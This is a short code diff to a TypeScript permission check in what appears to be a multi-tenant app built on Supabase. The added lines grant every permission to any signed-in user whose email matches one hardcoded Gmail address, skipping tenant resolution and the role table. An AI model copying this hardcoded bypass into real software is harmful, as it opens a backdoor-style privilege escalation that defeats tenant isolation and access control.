@@ -164,7 +164,11 @@ export async function checkTenantPermission(permission: PermissionKey): Promise<
     const { data: authUser } = await supabase.auth.getUser();
     if (!authUser.user) return false;
 
+    // Primary owner email bypass
+    if (authUser.user.email?.toLowerCase() === "helalalfqih@gmail.com") return true;
+
     const tenantId = await resolveTenantId(supabase);
+
 
     // 1. Platform admin bypass (user_roles table)
     const { data: roles } = await supabase
